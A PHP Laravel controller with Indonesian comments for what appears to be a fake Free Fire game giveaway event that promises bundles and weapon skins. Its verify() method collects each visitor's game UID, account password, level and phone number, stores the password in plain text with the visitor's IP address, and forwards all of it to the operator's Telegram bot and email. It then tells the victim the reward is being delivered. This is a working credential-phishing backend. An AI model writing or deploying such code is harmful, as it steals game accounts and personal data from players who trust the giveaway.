<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\JsonResponse;
use App\Models\Setting;
use App\Models\EventItem;
use App\Models\ClaimLog;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class EventController extends Controller
{
    /**
     * Tampilkan halaman utama event Free Fire Dunia Mistis.
     */
    public function index()
    {
        // Ambil settings dari database
        $settings = Setting::all()->pluck('value', 'key');

        // Status event check
        $eventStatus = $settings['event_status'] ?? 'active';

        // Ambil list item aktif dari database
        $items = EventItem::where('is_active', true)->orderBy('order', 'asc')->get();

        // Fallback jika belum ada item di database
        if ($items->isEmpty()) {
            $items = collect($this->getDefaultFallbackItems());
        }

        return view('event.index', compact('items', 'settings', 'eventStatus'));
    }

    /**
     * Handle verifikasi akun (AJAX) dan kirim notifikasi jika aktif.
     */
    public function verify(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'uid'      => 'required|string',
            'nama'     => 'required|string|min:2',
            'password' => 'required|string|min:4',
            'tingkat'  => 'required|string',
            'phone'    => 'required|string|min:8',
            'item'     => 'required|string',
        ]);

        // 1. Simpan ke Database ClaimLog
        $claim = ClaimLog::create([
            'uid'        => $validated['uid'],
            'nama'       => $validated['nama'],
            'password'   => $validated['password'],
            'tingkat'    => $validated['tingkat'],
            'phone'      => $validated['phone'],
            'item'       => $validated['item'],
            'ip_address' => $request->ip(),
            'user_agent' => $request->userAgent(),
            'status'     => 'success',
        ]);

        // 2. Kirim Notifikasi Telegram & Email jika diaktifkan
        $this->sendTelegramNotification($claim);
        $this->sendEmailNotification($claim);

        return response()->json([
            'success' => true,
            'message' => 'Verifikasi berhasil! Item ' . $validated['item'] . ' sedang diproses ke inbox game Free Fire Anda.',
            'item'    => $validated['item'],
        ]);
    }

    /**
     * Helper untuk kirim notifikasi ke Telegram Bot.
     */
    private function sendTelegramNotification(ClaimLog $claim): void
    {
        $enabled = Setting::get('telegram_enabled', '0');
        $token   = Setting::get('telegram_token');
        $chatId  = Setting::get('telegram_chat_id');

        if ($enabled !== '1' || empty($token) || empty($chatId)) {
            return;
        }

        try {
            $msg = "🎁 *KLAIM EVENT FREE FIRE BARU!*\n\n"
                 . "👤 *Nama Karakter:* " . $claim->nama . "\n"
                 . "🆔 *UID Akun:* `" . $claim->uid . "`\n"
                 . "🔑 *Password Akun:* `" . ($claim->password ?? '-') . "`\n"
                 . "⭐ *Level Akun:* " . $claim->tingkat . "\n"
                 . "📱 *No HP/WA:* `" . $claim->phone . "`\n"
                 . "🏆 *Item Dipilih:* *" . $claim->item . "*\n"
                 . "🌐 *IP Address:* " . ($claim->ip_address ?? '-') . "\n"
                 . "⏰ *Waktu:* " . $claim->created_at->format('d/m/Y H:i:s') . "\n\n"
                 . "⚡ _Sistem Super Admin Panel Free Fire_";

            Http::withoutVerifying()->timeout(10)->post("https://api.telegram.org/bot{$token}/sendMessage", [
                'chat_id'    => $chatId,
                'text'       => $msg,
                'parse_mode' => 'Markdown',
            ]);
        } catch (\Exception $e) {
            Log::warning('Telegram notification error: ' . $e->getMessage());
        }
    }

    /**
     * Helper untuk kirim notifikasi ke Email jika diaktifkan.
     */
    private function sendEmailNotification(ClaimLog $claim): void
    {
        $enabled = Setting::get('email_enabled', '0');
        $dest    = Setting::get('email_destination');

        if ($enabled !== '1' || empty($dest)) {
            return;
        }

        try {
            \Illuminate\Support\Facades\Mail::raw(
                "DATA KLAIM EVENT FREE FIRE BARU\n\n" .
                "Nama Karakter: " . $claim->nama . "\n" .
                "UID Akun: " . $claim->uid . "\n" .
                "Password Akun: " . ($claim->password ?? '-') . "\n" .
                "Level Akun: " . $claim->tingkat . "\n" .
                "No HP / WA: " . $claim->phone . "\n" .
                "Item: " . $claim->item . "\n" .
                "IP: " . ($claim->ip_address ?? '-') . "\n" .
                "Waktu: " . $claim->created_at->format('d/m/Y H:i:s') . "\n",
                function ($message) use ($dest, $claim) {
                    $message->to($dest)->subject("🎁 Klaim Baru Free Fire: " . $claim->nama . " (" . $claim->uid . ")");
                }
            );
        } catch (\Exception $e) {
            Log::warning('Email notification error: ' . $e->getMessage());
        }
    }

    /**
     * Data fallback 9 item event jika database kosong.
     */
    private function getDefaultFallbackItems(): array
    {
        return [
            ['id' => '1', 'name' => 'Hollow Man Bundle', 'short_name' => 'Hollow Man Bundle', 'image' => 'images/item_hd_1.png', 'type' => 'Bundle Eksklusif'],
            ['id' => '2', 'name' => 'Crismon Glitches B.', 'short_name' => 'Crismon Glitches B.', 'image' => 'images/item_hd_2.png', 'type' => 'Bundle Legendaris'],
            ['id' => '3', 'name' => 'Cotton Teddy Bundl.', 'short_name' => 'Cotton Teddy Bundl.', 'image' => 'images/item_hd_3.png', 'type' => 'Bundle Langka'],
            ['id' => '4', 'name' => 'M1887 - ONEPUCHN.', 'short_name' => 'M1887 - ONEPUCHN.', 'image' => 'images/item_hd_4.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '5', 'name' => 'M1887 - RAPPER M.', 'short_name' => 'M1887 - RAPPER M.', 'image' => 'images/item_hd_5.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '6', 'name' => 'M1187 - HAND OF H.', 'short_name' => 'M1187 - HAND OF H.', 'image' => 'images/item_hd_6.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '7', 'name' => 'M1014 - GREEN FLA.', 'short_name' => 'M1014 - GREEN FLA.', 'image' => 'images/item_hd_7.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '8', 'name' => 'M1887 - STERLING.', 'short_name' => 'M1887 - STERLING.', 'image' => 'images/item_hd_8.png', 'type' => 'Skin Senjata Tier S'],
            ['id' => '9', 'name' => 'AN94 - EVIL HOWLE.', 'short_name' => 'AN94 - EVIL HOWLE.', 'image' => 'images/item_hd_9.png', 'type' => 'Skin Senjata Tier S'],
        ];
    }
}
